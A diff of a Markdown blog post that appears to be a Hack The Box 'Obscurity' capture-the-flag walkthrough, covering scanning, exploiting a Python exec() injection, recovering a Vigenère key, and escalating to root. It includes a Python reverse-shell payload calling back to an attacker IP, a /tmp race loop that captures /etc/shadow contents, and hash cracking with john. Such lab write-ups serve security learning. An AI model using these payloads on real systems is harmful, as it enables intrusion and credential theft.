@@ -3,343 +3,157 @@ path: "/htb-obscurity"
 title: "Hack The Box - Obscurity"
 date: "04/17/2020"
 featuredImage: ../../images/obscurity.png
-tags: ["pentesting","hackthebox","linux"]
+tags: ["pentesting", "hackthebox", "linux"]
 ---
 
-As with every box,  start off with an NMAP scan to see what we are dealing with. 
+Obscurity was a fun box to hack because it is CTF styled with lot of python code. As the name implies the author hid the vulnerabilities in plain sight. The first step towards “owning” any box is to do some reconnaissance (recon) with NMAP. This recon yielded 4 ports 2 of which are open. Ports 22 and 8080.
+
 ```
-# Nmap 7.80 scan initiated Tue Apr 21 01:59:06 2020 as: nmap -v -sV -sC -oA nmap/safe -Pn 10.10.10.168
+nmap -v -sV -sC -oA nmap/safe -Pn 10.10.10.168
 Nmap scan report for 10.10.10.168
 Host is up (0.19s latency).
 Not shown: 996 filtered ports
 PORT     STATE  SERVICE    VERSION
 22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
 |   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
 |_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
 80/tcp   closed http
 8080/tcp open   http-proxy BadHTTPServer
-| fingerprint-strings: 
-|   GetRequest, HTTPOptions: 
-|     HTTP/1.1 200 OK
-|     Date: Tue, 21 Apr 2020 06:03:55
-|     Server: BadHTTPServer
-|     Last-Modified: Tue, 21 Apr 2020 06:03:55
-|     Content-Length: 4171
-|     Content-Type: text/html
-|     Connection: Closed
-|     <!DOCTYPE html>
-|     <html lang="en">
-|     <head>
-|     <meta charset="utf-8">
-|     <title>0bscura</title>
-|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-|     <meta name="viewport" content="width=device-width, initial-scale=1">
-|     <meta name="keywords" content="">
-|     <meta name="description" content="">
-|     <!-- 
-|     Easy Profile Template
-|     http://www.templatemo.com/tm-467-easy-profile
-|     <!-- stylesheet css -->
-|     <link rel="stylesheet" href="css/bootstrap.min.css">
-|     <link rel="stylesheet" href="css/font-awesome.min.css">
-|     <link rel="stylesheet" href="css/templatemo-blue.css">
-|     </head>
-|     <body data-spy="scroll" data-target=".navbar-collapse">
-|     <!-- preloader section -->
-|     <!--
-|     <div class="preloader">
-|_    <div class="sk-spinner sk-spinner-wordpress">
-| http-methods: 
+|
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: BadHTTPServer
 |_http-title: 0bscura
 9000/tcp closed cslistener
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-
 ```
 
-# Findings
-From the result of the NMAP scan, port `8080` is the attack vector. Navigating to this site, there is a message on the page that eluded to the presence of a file name `SuperSecureServer.py`. This file does not exist at the root directory an hence [wfuzz](https://tools.kali.org/web-applications/wfuzz) is needed.
+Web servers are usually riddled with vulnerabilities, hence port 8080 is a good first choice to enumerate and also continue recon.
+
+The tool gobuster can be used for enumerating the web server to find interesting endpoints; this yielded nothing. Reading through the content of the page that is hosted at port 8080, there is a message that states the filename of the web server (SuperSecureServer.py) and also implies that this file is publicly hosted in a “secret” directory.
+
+![HomePage](../../images/obscurity_homepage.gif)
+
+From the message on the site, the goal now is to fuzz the directory that might contain the file SuperSecureServer.py. The tool wfuzz can be leveraged for this.
 
 `wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py`
 
-The file is found to be located at `http://10.10.10.168:8080/develop/SuperSecureServer.py`. Line 139 of this file shows this script is vulnerable to Remote Code Execution. 
+Once completed, we can find the file at http://10.10.10.168:8000/develop/SuperSecureServer.py . The contents of this file reveals the inner working of the web server and how it can be exploited to perform a Remote Code Execution (RCE).
+
+View Source Code for [SuperSecureSever.py](https://gist.github.com/bascoe10/27fa856e886b6d09e80d5d580ed80e75)
+
+In Line 139, there is an invocation of the method exec() with the path that is passed via the HTTP request. The exec() method executes dynamically created python program. If we pass a valid python program as the HTTP path, it will get executed by exec().
+
 ```
 info = "output = 'Document: {}'" # Keep the output for later debug
 exec(info.format(path)) # This is how you do string formatting, right?
 ```
 
-The `path` variable is what we pass in the HTTP request. `exec` is a python method that executes dynamically created python programs. In our case if we pass a valid python script, it will be executed. *In order for this exploit to work there should be no space in the python script*. 
-A python reverse shell can script can be procured from [HackTricks](https://book.hacktricks.xyz/shells/shells/linux#python).
+From the above snippet, the variable info will contain an extrapolated string that contains the URL path. After the extrapolation the string will take the form:
 
-# User
-### Payload
+```
+"output = 'Document: <path>'"
+e.g "output = 'Document: /test/path'"
+```
+
+This string is a valid python program; a variable assignment. When this string is passed through exec(), it will create a variable name output which will have the a string value `Document: <path>`.
+
+At this point the goal is to pass a python script as the URL path that will initiate a reverse shell. For this we can leverage the python reverse shell from [HackTricks](https://book.hacktricks.xyz/shells/shells/linux#python). The imports in this script are redundant as they have already been imported in script and hence can be removed. The final python payload will now be:
+
 `';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.26",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-The request can now be crafted via burp to get a reverse shell. The resulting request is as follows
-```
-GET ';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.26",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' HTTP/1.1
-Host: 10.10.10.168:8080
-User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-```
-Once a shell is established, the next step  is to enumerate and elevate to a user account. The Only user on this box is `robert`. We can view the contents of his directory but cannot view the `user.txt`. 
+The single quotes are round this string are required to match the quotes of the string they will be extrapolated with.
 
-*Better Shell
-`python3 -c "import pty;pty.spawn('/bin/bash')"`
+With the help of Burpsuite, we can intercept a request to the server and then replace the path with the payload above. This payload assume that there is tcp listener on 1337 for the reverse shell. My goto is netcat.
 
-A couple of files stand out, 
-`check.txt`
-```
-www-data@obscure:/home/robert$ cat check.txt
-cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct! 
-```
+`nc -lvnp 1337`
 
-`out.txt`
-```
-www-data@obscure:/home/robert$ cat out.txt
-cat out.txt
-Â¦ÃšÃˆÃªÃšÃžÃ˜Ã›ÃÃ	Ã—ÃÃŠÃŸ
-ÃžÃŠÃšÃ‰Ã¦ÃŸÃÃ‹ÃšÃ›ÃšÃªÃ™Ã‰Ã«Ã©Ã‘Ã’ÃÃÃ
-ÃªÃ†Ã¡Ã™ÃžÃ£Ã’Ã‘ÃÃ¡Ã™Â¦Ã•Ã¦Ã˜Ã£ÃŠÃŽÃÃŸÃšÃªÃ†ÃÃ¡Ã¤Ã¨	ÃŽÃÃšÃŽÃ«Ã‘Ã“Ã¤Ã¡Ã›ÃŒÃ—	vwww-data@obscure:/home/robert$ 
-```
-`passwordreminder.txt`
-```
-www-data@obscure:/home/robert$ cat passwordreminder.txt
-cat passwordreminder.txt
-Â´Ã‘ÃˆÃŒÃ‰Ã Ã™ÃÃ‘Ã©Â¯Â·Â¿k
-```
+Once the reverse shell is established, we have an initial foothold in the box as user www-data. With this initial foothold, we can then start enumerating from within the box. This box only contains one user; robert.
 
-`SuperSecureCrypt.py`
-```
-www-data@obscure:/home/robert$ cat SuperSecureCrypt.py
-cat SuperSecureCrypt.py
-import sys
-import argparse
-
-def encrypt(text, key):
-    keylen = len(key)
-    keyPos = 0
-    encrypted = ""
-    for x in text:
-        keyChr = key[keyPos]
-        newChr = ord(x)
-        newChr = chr((newChr + ord(keyChr)) % 255)
-        encrypted += newChr
-        keyPos += 1
-        keyPos = keyPos % keylen
-    return encrypted
-
-def decrypt(text, key):
-    keylen = len(key)
-    keyPos = 0
-    decrypted = ""
-    for x in text:
-        keyChr = key[keyPos]
-        newChr = ord(x)
-        newChr = chr((newChr - ord(keyChr)) % 255)
-        decrypted += newChr
-        keyPos += 1
-        keyPos = keyPos % keylen
-    return decrypted
-
-parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')
-
-parser.add_argument('-i',
-                    metavar='InFile',
-                    type=str,
-                    help='The file to read',
-                    required=False)
-
-parser.add_argument('-o',
-                    metavar='OutFile',
-                    type=str,
-                    help='Where to output the encrypted/decrypted file',
-                    required=False)
-
-parser.add_argument('-k',
-                    metavar='Key',
-                    type=str,
-                    help='Key to use',
-                    required=False)
-
-parser.add_argument('-d', action='store_true', help='Decrypt mode')
-
-args = parser.parse_args()
-
-banner = "################################\n"
-banner+= "#           BEGINNING          #\n"
-banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
-banner+= "################################\n"
-banner += "  ############################\n"
-banner += "  #        FILE MODE         #\n"
-banner += "  ############################"
-print(banner)
-if args.o == None or args.k == None or args.i == None:
-    print("Missing args")
-else:
-    if args.d:
-        print("Opening file {0}...".format(args.i))
-        with open(args.i, 'r', encoding='UTF-8') as f:
-            data = f.read()
-
-        print("Decrypting...")
-        decrypted = decrypt(data, args.k)
-
-        print("Writing to {0}...".format(args.o))
-        with open(args.o, 'w', encoding='UTF-8') as f:
-            f.write(decrypted)
-    else:
-        print("Opening file {0}...".format(args.i))
-        with open(args.i, 'r', encoding='UTF-8') as f:
-            data = f.read()
-
-        print("Encrypting...")
-        encrypted = encrypt(data, args.k)
-
-        print("Writing to {0}...".format(args.o))
-        with open(args.o, 'w', encoding='UTF-8') as f:
-            f.write(encrypted)
-```
-
-By the looks of it, `check.txt` was encrypted using `SuperSecureCrypt.py` to yield `out.txt`. SuperSecureCrypt.py is an implementation of [Vigenère Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) . This being the case we can use the plain text, encrypted text pair to get the key used for encryption. The encryption process is as follows: `C = (M + K) mod 255` and decryption: `M = (C - K) mod 255`. Given that in this case we only have `M` and `C`, the key can be extracted as `K = (C - M) mod 255`
-
-This can be scripted to extract the key.
-```python
-pt = open('check.txt').read()
-et = open('out.txt').read()
-
-e_pt = list(map(lambda x: ord(x), list(pt)))
-e_et = list(map(lambda x: ord(x), list(et)))
-
-key = "".join(list(map(lambda x: chr(x[0]-x[1]), zip(e_et,e_pt))))
-print(key)
-```
-This will print `'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal'`, hence the key is `alexandrovich`
-
-This key will inturn be used to decrypt `passwordreminder` with `SuperSecureCrypt.py`
+We can list the content of Robert’s home directory, but cannot read the user flag file.
 
 ```
-www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/dcpt -k alexandrovich
-r.txt -o /tmp/dcpt -k alexandrovichasswordreminder
+drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
+-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
+-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
+-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
+-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
+-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
+```
+
+SuperSecureCrypt.py is a python implementation of Vigenère cipher.
+
+View Source Code for [SuperSecureCrypt.py](https://gist.github.com/bascoe10/4e76d772f761a874b089c28ec112120d)
+
+The key for a Vigenère cipher can be extracted if a plaintext, ciphertext pair is available. Here is why that is possible:
+
+```
+M := Plain text message
+C := Cipher text
+K := Encryption key
+** 255 is the number of characters in the message alphabet (ascii)Encryption process:
+C = (M + K) mod 255Decryption process:
+M = (C - K) mod 255Key retrieval:
+K = (C - M) mod 255
+```
+
+Looking at the content of check.txt we can see that it is the plaintext equivalent of out.txt. We can use this pair to extract the key. For this I created a simple python script:
+
+View code [here](https://gist.github.com/bascoe10/45422021877e4e53d0dd9065af9653a3)
+
+The output of this script is “alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal”. If the message is longer than the key, the key will be repeated. Therefore in this case the key is “alexandrovich”.
+
+The content of the file passwordreminder.txt is encrypted and hence need to be decrypted with SuperSecureCrypt.py using the recovered key.
+
+```
+python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/dcpt -k alexandrovich
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
 ################################
-  ############################
-  #        FILE MODE         #
-  ############################
+############################
+#        FILE MODE         #
+############################
 Opening file passwordreminder.txt...
 Decrypting...
 Writing to /tmp/dcpt...
 www-data@obscure:/home/robert$ cat /tmp/dcpt
-cat /tmp/dcpt
 SecThruObsFTW
 ```
-With this password at hand, we can now elevate to `robert`'s user account.
+
+The output is a password that we can use to login as the user robert. This can be done via ssh or su.
+
 ```
 www-data@obscure:/home/robert$ su robert
 su robert
 Password: SecThruObsFTW
 
 robert@obscure:~$ cat user.txt
-cat user.txt
 e4493782066b55fe2755708736ada2d7
 ```
 
-# Root
-First thing to check is what binaries `robert` has sudo access to execute 
+The next step from here is to pivot to the root account. First we can check what executable our current user (robert) can execute with sudo privileges without a password
+
 ```
 robert@obscure:~$ sudo -l
-sudo -l
 Matching Defaults entries for robert on obscure:
     env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User robert may run the following commands on obscure:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 ```
-Next step is to inspect this python script for vulnerabilities. 
+
+We can view the file /home/robert/BetterSSH/BetterSSH.py to find ways of exploiting it.
+
+View source code for [BetterSSH.py](https://gist.github.com/bascoe10/6c4ed31f65b3364687cc9bf8a24ce3eb)
+
+BetterSSH.py reads the contents of etc/shadow and writes it to a random file in /tmp/SSH/. My approach to exploiting this was to have a shell script that periodically dumps the content of all files in /tmp/SSH/. This being the case when BetterSSH.py is executed, it would leak the content of etc/shadow which would be capture by the running shell script.
+
 ```
-BetterSSH.py
-	 1	import sys
-  2	import random, string
-  3	import os
-  4	import time
-  5	import crypt
-  6	import traceback
-  7	import subprocess
-  8	
-  9	path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
- 10	session = {"user": "", "authenticated": 0}
- 11	try:
- 12	    session['user'] = input("Enter username: ")
- 13	    passW = input("Enter password: ")
- 14	
- 15	    with open('/etc/shadow', 'r') as f:
- 16	        data = f.readlines()
- 17	    data = [(p.split(":") if "$" in p else None) for p in data]
- 18	    passwords = []
- 19	    for x in data:
- 20	        if not x == None:
- 21	            passwords.append(x)
- 22	
- 23	    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
- 24	    with open('/tmp/SSH/'+path, 'w') as f:
- 25	        f.write(passwordFile)
- 26	    time.sleep(.1)
- 27	    salt = ""
- 28	    realPass = ""
- 29	    for p in passwords:
- 30	        if p[0] == session['user']:
- 31	            salt, realPass = p[1].split('$')[2:]
- 32	            break
- 33	
- 34	    if salt == "":
- 35	        print("Invalid user")
- 36	        os.remove('/tmp/SSH/'+path)
- 37	        sys.exit(0)
- 38	    salt = '$6$'+salt+'$'
- 39	    realPass = salt + realPass
- 40	
- 41	    hash = crypt.crypt(passW, salt)
- 42	
- 43	    if hash == realPass:
- 44	        print("Authed!")
- 45	        session['authenticated'] = 1
- 46	    else:
- 47	        print("Incorrect pass")
- 48	        os.remove('/tmp/SSH/'+path)
- 49	        sys.exit(0)
- 50	    os.remove(os.path.join('/tmp/SSH/',path))
- 51	except Exception as e:
- 52	    traceback.print_exc()
- 53	    sys.exit(0)
- 54	
- 55	if session['authenticated'] == 1:
- 56	    while True:
- 57	        command = input(session['user'] + "@Obscure$ ")
- 58	        cmd = ['sudo', '-u',  session['user']]
- 59	        cmd.extend(command.split(" "))
- 60	        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
- 61	
- 62	        o,e = proc.communicate()
- 63	        print('Output: ' + o.decode('ascii'))
- 64	        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
-```
-The contents of `etc/shadow` is read  and written to a random file in `tmp/SSH`. 
-One approach it to have a process that grabs and display the content of this directory when `BetterSSH.py` is executed.
-In `Terminal 1`
-```
+==========
+TERMINAL 1
+==========
+
 robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: robert
@@ -347,9 +161,10 @@ robert
 Enter password: SecThruObsFTW
 SecThruObsFTW
 Authed!
-```
-In `Terminal 2`
-```
+
+==========
+TERMINAL 2
+==========
 while [ 0 -lt 10 ]; do cat /tmp/SSH/*; sleep 0.2; done
 root
 $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
@@ -359,11 +174,10 @@ $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M5
 7
 ```
 
-*if a file not found exeception occurs, create `tmp/SSH`*
+With this hash for the root account, we can proceed to crack it and then use the result to login as root. (The hash is stored in pass.txt)
 
-We can now decrypt of the has of `root`'s password
 ```
-john --wordlist=rockyou.txt pass.txt 
+john --wordlist=rockyou.txt pass.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
@@ -374,14 +188,13 @@ mercedes         (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
-Now time to pivot to the root account and grab the flag
+
+With this password at hand we can not login as the root user and get the root flag.
+
 ```
 robert@obscure:~$ su root
 su root
-Password: mercedes
-
-root@obscure:/home/robert# cat /root/root.txt
+Password: mercedesroot@obscure:/home/robert# cat /root/root.txt
 cat /root/root.txt
 512fd4429f33a113a44d5acde23609e3
-root@obscure:/home/robert# 
 ```
